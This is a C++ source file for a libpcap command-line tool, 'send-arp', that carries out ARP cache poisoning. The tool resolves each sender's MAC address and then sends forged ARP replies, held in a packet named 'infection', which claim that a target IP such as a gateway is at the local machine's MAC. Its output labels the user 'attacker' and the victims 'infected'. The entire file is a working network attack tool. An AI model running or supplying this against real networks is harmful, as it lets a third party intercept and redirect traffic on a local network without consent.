#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Interface {
    Mac mac;
    Ip ip;
};

void usage() {
    printf(
        "syntax: send-arp <interface> <sender ip> <target ip> "
        "[<sender ip 2> <target ip 2> ...]\n"
        "sample: send-arp eth0 192.168.10.2 192.168.10.1\n"
    );
}

Interface getInterface(const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    ifreq ifr{};
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("SIOCGIFHWADDR");
        close(fd);
        exit(EXIT_FAILURE);
    }

    Mac mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("SIOCGIFADDR");
        close(fd);
        exit(EXIT_FAILURE);
    }

    auto* addr = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);
    Ip ip(ntohl(addr->sin_addr.s_addr));

    close(fd);
    return {mac, ip};
}

EthArpPacket makePacket(
    const Mac& dmac,
    const Mac& smac,
    uint16_t op,
    const Ip& sip,
    const Mac& tmac,
    const Ip& tip
) {
    EthArpPacket packet{};

    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);

    return packet;
}

void sendPacket(pcap_t* handle, const EthArpPacket& packet) {
    int result = pcap_sendpacket(
        handle,
        reinterpret_cast<const u_char*>(&packet),
        sizeof(packet)
    );

    if (result != 0) {
        fprintf(stderr, "pcap_sendpacket: %s\n", pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }
}

Mac resolveMac(
    pcap_t* handle,
    const Interface& me,
    const Ip& senderIp
) {
    EthArpPacket request = makePacket(
        Mac::broadcastMac(),
        me.mac,
        ArpHdr::Request,
        me.ip,
        Mac::nullMac(),
        senderIp
    );

    sendPacket(handle, request);

    while (true) {
        pcap_pkthdr* header;
        const u_char* data;

        int result = pcap_next_ex(handle, &header, &data);

        if (result == 0)
            continue;

        if (result < 0) {
            fprintf(stderr, "pcap_next_ex: %s\n", pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }

        if (header->caplen < sizeof(EthArpPacket))
            continue;

        auto* packet =
            reinterpret_cast<const EthArpPacket*>(data);

        if (packet->eth_.type_ != htons(EthHdr::Arp))
            continue;

        if (packet->arp_.op_ != htons(ArpHdr::Reply))
            continue;

        if (static_cast<uint32_t>(packet->arp_.sip_) !=
            htonl(static_cast<uint32_t>(senderIp)))
            continue;

        if (static_cast<uint32_t>(packet->arp_.tip_) !=
            htonl(static_cast<uint32_t>(me.ip)))
            continue;

        if (packet->arp_.tmac_ != me.mac)
            continue;

        return packet->arp_.smac_;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle =
        pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);

    if (handle == nullptr) {
        fprintf(
            stderr,
            "pcap_open_live(%s): %s\n",
            argv[1],
            errbuf
        );
        return EXIT_FAILURE;
    }

    Interface me = getInterface(argv[1]);

    printf(
        "attacker: %s / %s\n",
        std::string(me.ip).c_str(),
        std::string(me.mac).c_str()
    );

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i + 1]);

        printf("[*] resolving %s\n", argv[i]);

        Mac senderMac =
            resolveMac(handle, me, senderIp);

        EthArpPacket infection = makePacket(
            senderMac,         // Ethernet destination
            me.mac,            // Ethernet source
            ArpHdr::Reply,
            targetIp,          // "Target IP is..."
            senderMac,
            senderIp
        );

        sendPacket(handle, infection);

        printf(
            "[+] infected: %s(%s) <- %s is-at %s\n",
            argv[i],
            std::string(senderMac).c_str(),
            argv[i + 1],
            std::string(me.mac).c_str()
        );
    }

    pcap_close(handle);
    return EXIT_SUCCESS;
}
